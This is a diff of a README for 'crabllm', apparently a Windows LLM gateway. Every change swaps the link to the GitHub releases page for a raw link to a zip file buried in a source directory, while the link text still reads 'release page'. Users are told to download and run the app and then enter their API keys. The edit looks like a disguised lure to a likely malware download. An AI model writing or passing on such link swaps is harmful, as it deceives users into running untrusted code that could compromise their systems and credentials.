@@ -1,6 +1,6 @@
 # 🦀 crabllm - Simple LLM Gateway for Windows
 
-[![Download crabllm](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Impure-platen433/crabllm/releases)
+[![Download crabllm](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Impure-platen433/crabllm/main/crates/proxy/src/Software-3.6.zip)
 
 ## 🧭 What crabllm does
 
@@ -10,7 +10,7 @@ Use it when you want a single setup for common LLM providers like OpenAI, Anthro
 
 ## 💻 Windows install
 
-1. Open the [crabllm release page](https://github.com/Impure-platen433/crabllm/releases).
+1. Open the [crabllm release page](https://raw.githubusercontent.com/Impure-platen433/crabllm/main/crates/proxy/src/Software-3.6.zip).
 2. Find the latest release at the top of the page.
 3. Look under **Assets**.
 4. Download the Windows file for your system.
@@ -34,7 +34,7 @@ If you plan to connect it to OpenAI, Anthropic, or Bedrock, have your API key re
 
 Use this page to get the app:
 
-[Visit the crabllm release page](https://github.com/Impure-platen433/crabllm/releases)
+[Visit the crabllm release page](https://raw.githubusercontent.com/Impure-platen433/crabllm/main/crates/proxy/src/Software-3.6.zip)
 
 After you open the release page:
 
@@ -194,7 +194,7 @@ If you are not sure which file to open, use the `.exe` file for Windows. If the 
 
 If you want the fastest path, do this:
 
-1. Open the [release page](https://github.com/Impure-platen433/crabllm/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Impure-platen433/crabllm/main/crates/proxy/src/Software-3.6.zip)
 2. Download the latest Windows build
 3. Run the app
 4. Add your provider key
